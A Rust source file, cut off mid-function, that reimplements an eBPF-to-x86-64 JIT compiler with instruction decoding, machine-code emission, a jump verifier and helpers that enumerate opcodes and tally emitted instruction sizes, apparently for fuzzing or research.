use std::io::{self, Write};
use std::{mem, u16};
use std::collections::{HashMap, HashSet};
use std::ops::AddAssign;
use std::process::{Command, Stdio};
use arbitrary::{Arbitrary, Unstructured};

extern crate hex;
extern crate memmap2;
use memmap2::MmapMut;

pub static MAXBPFINST : usize = 128;

// prologue to add:
//   xor rax, rax
//   xor rbx, rbx
//   xor rcx, rcx
//   xor rdx, rdx
//   xor rbp, rbp
//   xor rsi, rsi
//   xor rdi, rdi
//   xor r8,  r8
//   xor r9,  r9
//   xor r10, r10
//   xor r11, r11
//   xor r12, r12
//   xor r13, r13
//   xor r14, r14
//   xor r15, r15
const PROLOGUE : &[u8] = b"\x48\x31\xc0\x48\x31\xdb\x48\x31\xc9\x48\x31\xd2\x48\x31\xed\x48\x31\xf6\x48\x31\xff\x4d\x31\xc0\x4d\x31\xc9\x4d\x31\xd2\x4d\x31\xdb\x4d\x31\xe4\x4d\x31\xed\x4d\x31\xf6\x4d\x31\xff";
const PROLOGUELEN: usize = PROLOGUE.len();

// epilogue:
//   mov eax, SYS_exit
//   syscall
const EPILOGUE : &[u8] = b"\xb8\x3c\x00\x00\x00\x0f\x05";
const EPILOGUELEN: usize = EPILOGUE.len();

#[allow(dead_code)]
#[derive(PartialEq, Copy, Clone)]
enum X86RegT {
    RAX, RBX, RCX, RDX, RBP, RSP, RSI, RDI, R8, R9, R10, R11, R12, R13, R14, R15,
}

impl X86RegT {
    fn is_ereg(&self) -> bool {
        match self {
            X86RegT::R8 |
            X86RegT::R9 |
            X86RegT::R10 |
            X86RegT::R11 |
            X86RegT::R12 |
            X86RegT::R13 |
            X86RegT::R14 |
            X86RegT::R15 => true,

            X86RegT::RAX |
            X86RegT::RBX |
            X86RegT::RCX |
            X86RegT::RDX |
            X86RegT::RBP |
            X86RegT::RSP |
            X86RegT::RSI |
            X86RegT::RDI => false,
        }
    }

    fn to_hex(&self) -> u8 {
        match self {
            X86RegT::RAX => 0,
            X86RegT::RDI => 7,
            X86RegT::RSI => 6,
            X86RegT::RDX => 2,
            X86RegT::RCX => 1,
            X86RegT::R8  => 0,
            X86RegT::RBX => 3,
            X86RegT::R13 => 5,
            X86RegT::R14 => 6,
            X86RegT::R15 => 7,
            X86RegT::RBP => 5,
            X86RegT::R10 => 2,
            X86RegT::R11 => 3,
            X86RegT::R9  => 1,
            _ => unreachable!(),
        }
    }
}

#[derive(PartialEq, Copy, Clone)]
enum BpfRegT {
    R0, R1, R2, R3, R4, R5, R6, R7, R8, R9, AuxReg
}

impl BpfRegT {
    fn to_x86reg(self) -> X86RegT {
        match self {
            BpfRegT::R0 => X86RegT::RAX,
            BpfRegT::R1 => X86RegT::RDI,
            BpfRegT::R2 => X86RegT::RSI,
            BpfRegT::R3 => X86RegT::RDX,
            BpfRegT::R4 => X86RegT::RCX,
            BpfRegT::R5 => X86RegT::R8,
            BpfRegT::R6 => X86RegT::RBX,
            BpfRegT::R7 => X86RegT::R13,
            BpfRegT::R8 => X86RegT::R14,
            BpfRegT::R9 => X86RegT::R15,
            BpfRegT::AuxReg => X86RegT::R11,
        }
    }
}

#[derive(arbitrary::Arbitrary, Debug, Clone)]
pub struct BpfInstT {
    pub opc: u8,
    pub regs: u8, /* dreg, sreg 4 bits each */
    pub off: i16,
    pub imm: i32,
}

#[derive(Debug, PartialEq)]
pub enum BpfClassT {
    BpfLd(BpfModeT, u8),          // 0
    BpfAlu(BpfAluOpT, BpfSrcT),   // 4
    BpfJmp(BpfJmpOpT, BpfSrcT),   // 5
    BpfJmp32(BpfJmpOpT, BpfSrcT), // 5
    BpfAlu64(BpfAluOpT, BpfSrcT), // 7
}
use BpfClassT::*;

#[derive(Debug, PartialEq)]
pub enum BpfModeT {
    BpfImm, // 0
    // TODO: unsupported for now
}
use BpfModeT::*;

#[derive(Debug, PartialEq)]
pub enum BpfSrcT {
    BpfX,
    BpfK,
}
use BpfSrcT::*;

#[derive(Debug, PartialEq, Copy, Clone)]
pub enum BpfAluOpT {
    BpfAdd,  // 0
    BpfSub,  // 1
    BpfMul,  // 2
    BpfDiv,  // 3
    BpfOr,   // 4
    BpfAnd,  // 5
    BpfLsh,  // 6
    BpfRsh,  // 7
    BpfNeg,  // 8
    BpfMod,  // 9
    BpfXor,  // a
    BpfMov,  // b
    BpfArsh, // c
}
use BpfAluOpT::*;

#[derive(Debug, PartialEq, Copy, Clone)]
pub enum BpfJmpOpT {
    BpfJa,   // 0
    BpfJeq,
    BpfJset,
    BpfJne,
    BpfJgt,
    BpfJlt,
    BpfJge,
    BpfJle,
    BpfJsgt,
    BpfJslt,
    BpfJsge,
    BpfJsle,
}
use BpfJmpOpT::*;

impl BpfInstT {
    fn code(&self) -> Option<BpfClassT> {

        match self.opc & 0x7 {
            0 /* BpfLd */ => {
                let sz = match self.opc & 0x18 {
                    0x00 => 4,
                    0x08 => 2,
                    0x10 => 1,
                    0x18 => 8,
                    _ => unreachable!(),
                };

                if self.opc & 0xe0 == 0x00 {
                    Some(BpfLd(BpfImm, sz))
                } else {
                    None
                }
            },

            4 | 7 /* BpfAlu | BpfAlu64 */ => {
                let typ = match self.opc & 0xf0 {
                    0x00 => BpfAdd,
                    0x10 => BpfSub,
                    0x20 => BpfMul,
                    0x30 => BpfDiv,
                    0x40 => BpfOr,
                    0x50 => BpfAnd,
                    0x60 => BpfLsh,
                    0x70 => BpfRsh,
                    0x80 => BpfNeg,
                    0x90 => BpfMod,
                    0xa0 => BpfXor,
                    0xb0 => BpfMov,
                    0xc0 => BpfArsh,
                    _ => return None,
                };

                let styp = if self.opc & 0x8 == 0 { BpfK } else { BpfX };

                if self.opc & 0x7 == 4 {
                    Some(BpfAlu(typ, styp))
                } else {
                    Some(BpfAlu64(typ, styp))
                }
            },

            5 | 6 /* BpfJmp | BpfJmp32 */ => {
                let typ = match self.opc & 0xf0 {
                    0x00 => BpfJa,
                    0x10 => BpfJeq,
                    0x20 => BpfJgt,
                    0x30 => BpfJge,
                    0x40 => BpfJset,
                    0x50 => BpfJne,
                    0x60 => BpfJsgt,
                    0x70 => BpfJsge,
                    0xa0 => BpfJlt,
                    0xb0 => BpfJle,
                    0xc0 => BpfJslt,
                    0xd0 => BpfJsle,
                    _ => return None,
                };

                let styp = if self.opc & 0x8 == 0 { BpfK } else { BpfX };
                if self.opc & 0x7 == 5 {
                    Some(BpfJmp(typ, styp))
                } else {
                    if typ == BpfJa { None } else { Some(BpfJmp32(typ, styp)) }
                }
            },

            _ => None,
        }
    }

    fn src_reg(&self) -> BpfRegT {
        match self.regs & 0xf0 {
            0x00 => BpfRegT::R0,
            0x10 => BpfRegT::R1,
            0x20 => BpfRegT::R2,
            0x30 => BpfRegT::R3,
            0x40 => BpfRegT::R4,
            0x50 => BpfRegT::R5,
            0x60 => BpfRegT::R6,
            0x70 => BpfRegT::R7,
            0x80 => BpfRegT::R8,
            0x90 => BpfRegT::R9,
            _ => unreachable!(),
        }
    }

    fn dst_reg(&self) -> BpfRegT {
        match self.regs & 0x0f {
            0x00 => BpfRegT::R0,
            0x01 => BpfRegT::R1,
            0x02 => BpfRegT::R2,
            0x03 => BpfRegT::R3,
            0x04 => BpfRegT::R4,
            0x05 => BpfRegT::R5,
            0x06 => BpfRegT::R6,
            0x07 => BpfRegT::R7,
            0x08 => BpfRegT::R8,
            0x09 => BpfRegT::R9,
            _ => unreachable!(),
        }
    }

}

macro_rules! EMIT {
    ($i: ident, $c: ident, $b1:expr) => {
        $i[$c] = $b1;
        $c += 1;
    };

    ($i: ident, $c: ident, $b1:expr, $b2:expr) => {
        $i[$c]   = $b1;
        $i[$c+1] = $b2;
        $c += 2;
    };

    ($i: ident, $c: ident, $b1:expr, $b2:expr, $b3:expr) => {
        $i[$c]   = $b1;
        $i[$c+1] = $b2;
        $i[$c+2] = $b3;
        $c += 3;
    };

    ($i: ident, $c: ident, $b1:expr, $b2:expr, $b3:expr, $b4:expr) => {
        $i[$c]   = $b1;
        $i[$c+1] = $b2;
        $i[$c+2] = $b3;
        $i[$c+3] = $b4;
        $c += 4;
    };
}

macro_rules! EMIT_imm32 {
    ($i: ident, $c: ident, $v: expr) => {
        $i[$c]   = ($v & 0xff) as u8;
        $i[$c+1] = (($v >> 8) & 0xff) as u8;
        $i[$c+2] = (($v >> 16) & 0xff) as u8;
        $i[$c+3] = (($v >> 24) & 0xff) as u8;
        $c += 4;
    };

    ($i: ident, $c: ident, $b1:expr, $v: expr) => {
        $i[$c] = $b1;
        $c += 1;
        EMIT_imm32!($i, $c, $v);
    };

    ($i: ident, $c: ident, $b1:expr, $b2:expr, $v: expr) => {
        $i[$c]   = $b1;
        $i[$c+1] = $b2;
        $c += 2;
        EMIT_imm32!($i, $c, $v);
    };

    ($i: ident, $c: ident, $b1:expr, $b2:expr, $b3:expr, $v: expr) => {
        $i[$c]   = $b1;
        $i[$c+1] = $b2;
        $i[$c+2] = $b3;
        $c += 3;
        EMIT_imm32!($i, $c, $v);
    };

    ($i: ident, $c: ident, $b1:expr, $b2:expr, $b3:expr, $b4:expr, $v: expr) => {
        $i[$c]   = $b1;
        $i[$c+1] = $b2;
        $i[$c+2] = $b3;
        $i[$c+3] = $b4;
        $c += 4;
        EMIT_imm32!($i, $c, $v);
    };
}

macro_rules! EMIT_mov {
    ($i: ident, $c: ident, $d: expr, $s: expr) => {
        if $d != $s {
            EMIT!($i, $c, add_2mod(0x48, $d, $s), 0x89, add_2reg(0xc0, $d, $s));
        }
    }
}

macro_rules! is_imm8 {
    ($v: expr) => {
        $v <= 127 && $v >= -128
    }
}

macro_rules! is_uimm32 {
    ($v: expr) => {
        $v == (($v as u32) as u64)
    }
}

macro_rules! is_simm32 {
    ($v: expr) => {
        $v == (($v as i32) as i64)
    }
}

fn add_1mod(byte: u8, r1: &X86RegT) -> u8 {
    if r1.is_ereg() { byte | 1 } else { byte }
}

fn add_1reg(byte: u8, reg: &X86RegT) -> u8 {
    byte + reg.to_hex()
}

fn add_2mod(byte: u8, r1: &X86RegT, r2: &X86RegT) -> u8 {
    let byte = if r1.is_ereg() { byte | 1 } else { byte };
    if r2.is_ereg() { byte | 4 } else { byte }
}

fn add_2reg(byte: u8, dreg: &X86RegT, sreg: &X86RegT) -> u8 {
    byte + dreg.to_hex() + (sreg.to_hex() << 3)
}

fn emit_mov_reg(image: &mut [u8], cnt: usize, opcls: &BpfClassT, dreg: &X86RegT, sreg: &X86RegT) -> usize {
    let mut cnt = cnt;
    match opcls {
        BpfAlu64(..) => {
            EMIT_mov!(image, cnt, dreg, sreg);
            cnt
        },

        BpfAlu(..) => {
            if dreg.is_ereg() || sreg.is_ereg() {
                EMIT!(image, cnt, add_2mod(0x40, dreg, sreg));
            }
            EMIT!(image, cnt, 0x89, add_2reg(0xc0, dreg, sreg));
            cnt
        },

        _ => unreachable!(),
    }
}

fn emit_mov_imm32(image: &mut[u8], cnt: usize, opcls: &BpfClassT, dreg: &X86RegT, imm: i32) -> usize {
    let mut cnt = cnt;
    if matches!(opcls, BpfAlu64(..)) && imm < 0 {
        EMIT_imm32!(image, cnt, add_1mod(0x48, dreg), 0xc7, add_1reg(0xc0, dreg), imm);
    } else if imm == 0 {
        if dreg.is_ereg() {
            EMIT!(image, cnt, add_2mod(0x40, dreg, dreg));
        }

        EMIT!(image, cnt, 0x31, add_2reg(0xc0, dreg, dreg));
    } else {
        if dreg.is_ereg() {
            EMIT!(image, cnt, add_1mod(0x40, dreg));
        }

        EMIT_imm32!(image, cnt, add_1reg(0xb8, dreg), imm);
    }

    cnt
}

fn emit_mov_imm64(image: &mut[u8], cnt: usize, dreg: &X86RegT, imm_l: i32, imm_h: i32) -> usize {
    let mut cnt = cnt;

    if is_uimm32!((((imm_h as u64) << 32) | (imm_l as u64)) as u64) {
        cnt = cnt + emit_mov_imm32(image, cnt, &BpfAlu(BpfAdd, BpfX), dreg, imm_l);
    } else {
        EMIT!(image, cnt, add_1mod(0x48, dreg), add_1reg(0xb8, dreg));
        EMIT_imm32!(image, cnt, imm_l);
        EMIT_imm32!(image, cnt, imm_h);
    }
    cnt
}

fn emit_cond_jump(image: &mut[u8], cnt: usize, addrs: &mut [u32], cidx: usize, op: &BpfJmpOpT, off: i16) -> Option<usize> {
    let mut cnt = cnt;

    let jmp_cond : u8 = match op {
        BpfJeq => 0x74,
        BpfJset | BpfJne => 0x75,
        BpfJgt => 0x77,
        BpfJlt => 0x72,
        BpfJge => 0x73,
        BpfJle => 0x76,
        BpfJsgt => 0x7f,
        BpfJslt => 0x7c,
        BpfJsge => 0x7d,
        BpfJsle => 0x7e,
        _ => return None,
    };

    let joff = addrs[((cidx + 1) as i16 + off) as usize] as i64 - addrs[cidx + 1] as i64;
    if is_imm8!(joff) {
        EMIT!(image, cnt, jmp_cond, joff as u8);
        Some(cnt)
    } else if is_simm32!(joff) {
        EMIT_imm32!(image, cnt, 0x0f, jmp_cond + 0x10, joff);
        Some(cnt)
    } else {
        None
    }
}

pub fn do_jit(b_inst: &[BpfInstT], addrs: &mut [u32], mut outimg: Option<&mut [u8]>) -> Option<usize> {
    let mut clen: usize = 0;

    // emit prologue
    clen += PROLOGUELEN;
    if let Some(ref mut oimg) = outimg {
        oimg[0..clen].copy_from_slice(&PROLOGUE);
    }

    let mut ilens = Vec::new();
    let mut ja_offsets = Vec::new();

    let mut cidx = 0;
    while cidx < b_inst.len() {
        let cidx_clone = cidx;

        let mut ilen: usize = 0;
        let mut image: [u8; 128] = [0; 128];

        let cinst : &BpfInstT = &b_inst[cidx];

        let opc_d = cinst.code()?;

        let s_breg = cinst.src_reg();
        let d_breg = cinst.dst_reg();

        let s_xreg = s_breg.to_x86reg();
        let d_xreg = d_breg.to_x86reg();

        let imm32  = cinst.imm;

        let aux_xreg = BpfRegT::AuxReg.to_x86reg();
        let r0_xreg  = BpfRegT::R0.to_x86reg();

        match cinst.code()? {
            BpfAlu(op, BpfX) | BpfAlu64(op, BpfX) if op == BpfAdd || op == BpfSub ||
                                                     op == BpfAnd || op == BpfOr || op == BpfXor => {
                let b2 = match op {
                    BpfAdd => 0x01,
                    BpfSub => 0x29,
                    BpfAnd => 0x21,
                    BpfOr  => 0x09,
                    BpfXor => 0x31,
                    _ => unreachable!(),
                };

                if let BpfAlu64(..) = &opc_d {
                    EMIT!(image, ilen, add_2mod(0x48, &d_xreg, &s_xreg));
                } else if s_xreg.is_ereg() || d_xreg.is_ereg() {
                    EMIT!(image, ilen, add_2mod(0x40, &d_xreg, &s_xreg));
                }

                EMIT!(image, ilen, b2, add_2reg(0xc0, &d_xreg, &s_xreg));
            },

            BpfAlu(BpfMov, BpfX) | BpfAlu64(BpfMov, BpfX) => {
                ilen = emit_mov_reg(&mut image, ilen, &opc_d, &d_xreg, &s_xreg);
            },

            BpfAlu(BpfNeg, _) | BpfAlu64(BpfNeg, _) => {
                if let BpfAlu64(..) = &opc_d {
                    EMIT!(image, ilen, add_1mod(0x48, &d_xreg));
                } else if d_xreg.is_ereg() {
                    EMIT!(image, ilen, add_1mod(0x40, &d_xreg));
                }

                EMIT!(image, ilen, 0xf7, add_1reg(0xd8, &d_xreg));
            },

            BpfAlu(op, BpfK) | BpfAlu64(op, BpfK) if op == BpfAdd || op == BpfSub ||
                                                     op == BpfAnd || op == BpfOr || op == BpfXor => {
                if let BpfAlu64(..) = &opc_d {
                    EMIT!(image, ilen, add_1mod(0x48, &d_xreg));
                } else if d_xreg.is_ereg() {
                    EMIT!(image, ilen, add_1mod(0x40, &d_xreg));
                }

                let (b3, b2) = match op {
                    BpfAdd => (0xc0, 0x05),
                    BpfSub => (0xe8, 0x2d),
                    BpfAnd => (0xe0, 0x25),
                    BpfOr  => (0xc8, 0x0d),
                    BpfXor => (0xf0, 0x35),
                    _      => unreachable!(),
                };

                if is_imm8!(imm32) {
                    EMIT!(image, ilen, 0x83, add_1reg(b3, &d_xreg), (imm32 & 0xff) as u8);
                } else if d_xreg == X86RegT::RAX {
                    EMIT_imm32!(image, ilen, b2, imm32);
                } else {
                    EMIT_imm32!(image, ilen, 0x81, add_1reg(b3, &d_xreg), imm32);
                }

            },

            BpfAlu64(BpfMov, BpfK) | BpfAlu(BpfMov, BpfK) => {
                ilen = emit_mov_imm32(&mut image, ilen, &opc_d, &d_xreg, imm32);
            },

            BpfLd(BpfImm, 8) => {
                ilen = emit_mov_imm64(&mut image, ilen, &d_xreg, imm32, b_inst[cidx+1].imm);
                addrs[cidx+1] = 0;
                cidx += 1;
            },

            BpfAlu(op, sm) | BpfAlu64(op, sm) if op == BpfMod || op == BpfDiv => {
                EMIT!(image, ilen, 0x50);
                EMIT!(image, ilen, 0x52);

                if sm == BpfX {
                    EMIT_mov!(image, ilen, &aux_xreg, &s_xreg);
                } else {
                    EMIT_imm32!(image, ilen, 0x49, 0xc7, 0xc3, imm32);
                }

                EMIT_mov!(image, ilen, &r0_xreg, &d_xreg);

                EMIT!(image, ilen, 0x31, 0xd2);

                if let BpfAlu64(..) = &opc_d {
                    EMIT!(image, ilen, 0x49, 0xf7, 0xf3);
                } else {
                    EMIT!(image, ilen, 0x41, 0xf7, 0xf3);
                }

                if op == BpfMod {
                    EMIT!(image, ilen, 0x49, 0x89, 0xd3);
                } else {
                    EMIT!(image, ilen, 0x49, 0x89, 0xc3);
                }

                EMIT!(image, ilen, 0x5a);
                EMIT!(image, ilen, 0x58);

                EMIT_mov!(image, ilen, &d_xreg, &aux_xreg);
            },

            BpfAlu(BpfMul, sm) | BpfAlu64(BpfMul, sm) => {

                if d_breg != BpfRegT::R0 {
                    EMIT!(image, ilen, 0x50);
                }

                if d_breg != BpfRegT::R3 {
                    EMIT!(image, ilen, 0x52);
                }

                EMIT_mov!(image, ilen, &aux_xreg, &d_xreg);

                if sm == BpfX {
                    ilen = emit_mov_reg(&mut image, ilen, &opc_d, &r0_xreg, &s_xreg);
                } else {
                    ilen = emit_mov_imm32(&mut image, ilen, &opc_d, &r0_xreg, imm32);
                }

                if let BpfAlu64(..) = &opc_d {
                    EMIT!(image, ilen, add_1mod(0x48, &aux_xreg));
                } else if aux_xreg.is_ereg() {
                    EMIT!(image, ilen, add_1mod(0x40, &aux_xreg));
                }

                EMIT!(image, ilen, 0xf7, add_1reg(0xe0, &aux_xreg));

                if d_breg != BpfRegT::R3 {
                    EMIT!(image, ilen, 0x5a);
                }

                if d_breg != BpfRegT::R0 {
                    EMIT_mov!(image, ilen, &d_xreg, &r0_xreg);
                    EMIT!(image, ilen, 0x58);
                }
            },

            BpfAlu(op, BpfX) | BpfAlu64(op, BpfX) if op == BpfLsh || op == BpfRsh || op == BpfArsh => {
                let mut tmp_d_xreg = d_xreg;
                if d_breg == BpfRegT::R4 {
                    EMIT_mov!(image, ilen, &aux_xreg, &d_xreg);
                    tmp_d_xreg = aux_xreg;
                }

                let r4_xreg = BpfRegT::R4.to_x86reg();

                if s_breg != BpfRegT::R4 {
                    EMIT!(image, ilen, 0x51);
                    EMIT_mov!(image, ilen, &r4_xreg, &s_xreg);
                }

                if let BpfAlu64(..) = &opc_d {
                    EMIT!(image, ilen, add_1mod(0x48, &tmp_d_xreg));
                } else if tmp_d_xreg.is_ereg() {
                    EMIT!(image, ilen, add_1mod(0x40, &tmp_d_xreg));
                }

                let b3 = match op {
                    BpfLsh  => 0xe0,
                    BpfRsh  => 0xe8,
                    BpfArsh => 0xf8,
                    _       => unreachable!(),
                };

                EMIT!(image, ilen, 0xd3, add_1reg(b3, &tmp_d_xreg));

                if s_breg != BpfRegT::R4 {
                    EMIT!(image, ilen, 0x59);
                }

                if d_xreg == r4_xreg {
                    EMIT_mov!(image, ilen, &d_xreg, &aux_xreg);
                }
            },

            BpfAlu(op, BpfK) | BpfAlu64(op, BpfK) if op == BpfLsh || op == BpfRsh || op == BpfArsh => {
                if let BpfAlu64(..) = &opc_d {
                    EMIT!(image, ilen, add_1mod(0x48, &d_xreg));
                } else if d_xreg.is_ereg() {
                    EMIT!(image, ilen, add_1mod(0x40, &d_xreg));
                }

                let b3 = match op {
                    BpfLsh  => 0xe0,
                    BpfRsh  => 0xe8,
                    BpfArsh => 0xf8,
                    _       => unreachable!(),
                };

                if imm32 == 1 {
                    EMIT!(image, ilen, 0xd1, add_1reg(b3, &d_xreg));
                } else {
                    EMIT!(image, ilen, 0xc1, add_1reg(b3, &d_xreg), imm32 as u8);
                }
            },

            BpfJmp(op, BpfX) | BpfJmp32(op, BpfX) if op == BpfJeq || op == BpfJne || op == BpfJgt ||
                                                      op == BpfJlt || op == BpfJge || op == BpfJle ||
                                                      op == BpfJsgt || op == BpfJslt || op == BpfJsge ||
                                                      op == BpfJsle => {
                if let BpfJmp(..) = &opc_d { // TODO: make this into a macro
                    EMIT!(image, ilen, add_2mod(0x48, &d_xreg, &s_xreg));
                } else if d_xreg.is_ereg() || s_xreg.is_ereg() {
                    EMIT!(image, ilen, add_2mod(0x40, &d_xreg, &s_xreg));
                }
                EMIT!(image, ilen, 0x39, add_2reg(0xc0, &d_xreg, &s_xreg));
                if let Some(x) = emit_cond_jump(&mut image, ilen, addrs, cidx, &op, cinst.off) {
                    ilen = x;
                } else {
                    return None;
                }
            },

            BpfJmp(op @ BpfJset, BpfX) | BpfJmp32(op @ BpfJset, BpfX) => {
                if let BpfJmp(..) = &opc_d {
                    EMIT!(image, ilen, add_2mod(0x48, &d_xreg, &s_xreg));
                } else if d_xreg.is_ereg() || s_xreg.is_ereg() {
                    EMIT!(image, ilen, add_2mod(0x40, &d_xreg, &s_xreg));
                }
                EMIT!(image, ilen, 0x85, add_2reg(0xc0, &d_xreg, &s_xreg));
                if let Some(x) = emit_cond_jump(&mut image, ilen, addrs, cidx, &op, cinst.off) {
                    ilen = x;
                } else {
                    return None;
                }
            },

            BpfJmp(op @ BpfJset, BpfK) | BpfJmp32(op @ BpfJset, BpfK) => {
                if let BpfJmp(..) = &opc_d {
                    EMIT!(image, ilen, add_1mod(0x48, &d_xreg));
                } else if d_xreg.is_ereg() {
                    EMIT!(image, ilen, add_1mod(0x40, &d_xreg));
                }
                EMIT_imm32!(image, ilen, 0xf7, add_1reg(0xc0, &d_xreg), imm32);
                if let Some(x) = emit_cond_jump(&mut image, ilen, addrs, cidx, &op, cinst.off) {
                    ilen = x;
                } else {
                    return None;
                }
            },

            BpfJmp(op, BpfK) | BpfJmp32(op, BpfK) if op == BpfJeq || op == BpfJne || op == BpfJgt ||
                                                      op == BpfJlt || op == BpfJge || op == BpfJle ||
                                                      op == BpfJsgt || op == BpfJslt || op == BpfJsge ||
                                                      op == BpfJsle => {
                if imm32 == 0 { // test d_xreg, d_xreg
                    if let BpfJmp(..) = &opc_d {
                        EMIT!(image, ilen, add_2mod(0x48, &d_xreg, &d_xreg));
                    } else if d_xreg.is_ereg() {
                        EMIT!(image, ilen, add_2mod(0x40, &d_xreg, &d_xreg));
                    }
                    EMIT!(image, ilen, 0x85, add_2reg(0xc0, &d_xreg, &d_xreg));
                } else { // cmp d_xreg, imm8/32
                    if let BpfJmp(..) = &opc_d {
                        EMIT!(image, ilen, add_1mod(0x48, &d_xreg));
                    } else if d_xreg.is_ereg() {
                        EMIT!(image, ilen, add_1mod(0x40, &d_xreg));
                    }

                    if is_imm8!(imm32) {
                        EMIT!(image, ilen, 0x83, add_1reg(0xf8, &d_xreg), imm32 as u8);
                    } else {
                        EMIT_imm32!(image, ilen, 0x81, add_1reg(0xf8, &d_xreg), imm32);
                    }
                }

                if let Some(x) = emit_cond_jump(&mut image, ilen, addrs, cidx, &op, cinst.off) {
                    ilen = x;
                } else {
                    return None;
                }
            },

            BpfJmp(BpfJa, _) => {
                let jmpoff : i64 = if cinst.off == -1 {
                    -2
                } else {
                    addrs[((cidx + 1) as i16 + cinst.off) as usize] as i64 - addrs[cidx + 1] as i64
                };
                ja_offsets.push(jmpoff);

                if jmpoff != 0 {
                    if is_imm8!(jmpoff) {
                        EMIT!(image, ilen, 0xeb, jmpoff as u8);
                    } else if is_simm32!(jmpoff) {
                        EMIT_imm32!(image, ilen, 0xe9, jmpoff);
                    } else {
                        return None;
                    }
                }
            },

            _ => unimplemented!("{:?}", opc_d),

        }

        // pop BpfInstT { opc: 36, regs: 1, off: 0, imm: 184466110 }
        // push BpfInstT { opc: 36, regs: 1, off: 0, imm: 184466110 }
        // if(image.contains(&(0x5a as u8))) {
        //     println!("pop {:?}", cinst)
        // }
        // if(image.contains(&(0x50 as u8))) {
        //     println!("push {:?}", cinst)
        // }

        if let Some(ref mut oimg) = outimg {
            oimg[clen..clen+ilen].copy_from_slice(&image[..ilen]);
        }
        clen += ilen;
        addrs[cidx + 1] = clen as u32;

        cidx += 1;

        ilens.push(ilen);
        // println!("{:?}\t{}\t{}", b_inst[cidx_clone].opc, ilen, addrs[cidx_clone] - PROLOGUELEN as u32);
    }

    println!("BpfJa offsets: {:?}", ja_offsets);
    println!("ilens: {:?}", ilens);
    // let addrs2: Vec<u32> = addrs.iter().map(|it| if *it == 0  { 0} else {it - PROLOGUELEN as u32}).collect();
    // println!("addrs: {:?}", addrs2);

    if let Some(ref mut oimg) = outimg {
        oimg[clen..clen+EPILOGUELEN].copy_from_slice(&EPILOGUE);
    }
    clen += EPILOGUELEN;

    Some(clen)
}

pub fn verify_jmps(b_inst: &[BpfInstT]) -> Result<(), &str> {
    let mut idx = 0;
    while idx < b_inst.len() {
        let inst = &b_inst[idx];
        if let Some(opc) = inst.code() {
            if matches!(opc, BpfJmp(BpfJa, _)) || matches!(opc, BpfJmp(op, _) | BpfJmp32(op, _) if op != BpfJa) {
                if let Some(target) = (idx as i32 + 1).checked_add(inst.off as i32) {
                    if target < 0 || target > b_inst.len() as _ {
                        return Err("bad jump target");
                    }

                    if target > 0 {
                        if let Some(BpfLd(BpfImm, 8)) = b_inst[target as usize - 1].code() {
                            return Err("bad jump target");
                        } // else do nothing? because if it is None, we will handle it when we
                          // reach that dest
                    }
                } else {
                    return Err("bad jump target");
                }
            } else if matches!(opc, BpfAlu(..) | BpfAlu64(..)) {
                ();
            } else if matches!(opc, BpfLd(BpfImm, 8)) {
                idx += 1;
            } else {
                return Err("Unsupported opcode");
            }
        } else {
            return Err("Bad opcode");
        }
        idx += 1;
    }

    Ok(())
}

pub fn parse_raw_bytes(inp: &[u8]) -> Option<Vec<BpfInstT>> {
    if inp.len() % 8 != 0 { return None; }

    let mut ret = Vec::new();
    for i in (0..inp.len()).step_by(8) {
        ret.push(BpfInstT {
            opc: inp[i],
            regs: inp[i+1],
            off: inp[i+2] as i16 | (inp[i+3] as i16) << 8,
            imm: inp[i+4] as i32 | (inp[i+5] as i32) << 8 | (inp[i+6] as i32) << 16 | (inp[i+7] as i32) << 24,
        });
    }

    Some(ret)
}

fn is_supported(opc: u8) -> bool {
    if opc & 0x7 == 0 {
        return ((opc & 0x18) == 0x18) && ((opc & 0xe0) == 0x00);
    }
    return true;
}

fn posible_sizes() {
    let mut instructions: Vec<BpfInstT> = Vec::with_capacity(u16::MAX as usize);
    let mut all : HashMap<usize, usize>= HashMap::new();
    for opc in 0..256 {
        for regs in 0..256 {
            if !is_supported(opc as u8) {
                continue;
            }
            if (regs & 0xf0) > 0x90 || (regs & 0x0f) > 0x09 {
                continue;
            }
            let inst = BpfInstT {
                opc: opc as u8,
                regs: regs as u8,
                off: 0x0,
                imm: 0x0afebabe as i32,
            };
            if inst.code().is_some() {
                instructions.clear();
                // push each instruction twice because of immediates...
                instructions.push(inst);
                instructions.push(BpfInstT {
                    opc: opc as u8,
                    regs: regs as u8,
                    off: 0x0,
                    imm: 0x0afebabe as i32,
                });

                let plen = PROLOGUELEN as u32;
                let mut addrs: Vec<u32> = (0..instructions.len() + 1).map(|i| plen + 64 * i as u32).collect();
                let size = PROLOGUELEN + 1000 + 8 * instructions.len() + EPILOGUELEN;
                let mut image: Vec<u8> = vec![0; size];
                let x = do_jit(instructions.as_slice(), addrs.as_mut_slice(), Some(&mut image)).unwrap();
                let size = (x - PROLOGUELEN - EPILOGUELEN) / 2;

                all.entry(size).and_modify(|i| i.add_assign(1)).or_insert(1);
            }
        }
    }
    for (key, value) in all {
        println!("possible_sizes: {} bytes, {} times", key, value);
    }
}

fn print_all() {
    let mut instructions: Vec<BpfInstT> = Vec::with_capacity(u16::MAX as usize);
    let mut done = false;
    for opc in 0..256 {
        if done { break }
        for regs in 0..256 {
            if done { break }
            if true {
                if !is_supported(opc as u8) {
                    continue;
                }
                if (regs & 0xf0) > 0x90 || (regs & 0x0f) > 0x09 {
                    continue;
                }
                let inst = BpfInstT {
                    opc: opc as u8,
                    regs: regs as u8,
                    off: 0x0,
                    imm: 0x0afebabe as i32,
                };
                if inst.code().is_some() {
                    instructions.push(inst);
                }
            } else {
                instructions.push(BpfInstT { opc: 36, regs: 1, off: 0, imm: 0 });
                done = true;
            }
        }
    }

    println!("{}/{} supported", instructions.len(), u16::MAX);

    let plen = PROLOGUELEN as u32;
    let mut addrs: Vec<u32> = (0..instructions.len() + 1).map(|i| plen + 64 * i as u32).collect();

    let size = PROLOGUELEN + 1000000 + 8 * instructions.len() + EPILOGUELEN;
    let mut image: Vec<u8> = vec![0; size];
    let x = do_jit(instructions.as_slice(), addrs.as_mut_slice(), Some(&mut image)).unwrap();

    disassemble(&image[0..x], "x")
}

fn disassemble_some_instructions() {
    let instructions = vec![
        BpfInstT { opc: 5,    regs: 0, off: -1, imm: 0 },
        BpfInstT { opc: 0x18, regs: 0, off: 0, imm: 0xb3b2b1b0u32 as i32 },
        BpfInstT { opc: 0,    regs: 0, off: 0, imm: 0xb7b6b5b4u32 as i32 },
        BpfInstT { opc: 5,    regs: 0, off: -1, imm: 0 },
    ];

    let plen = PROLOGUELEN as u32;
    let mut addrs: Vec<u32> = (0..instructions.len() + 1).map(|i| plen + 64 * i as u32).collect();

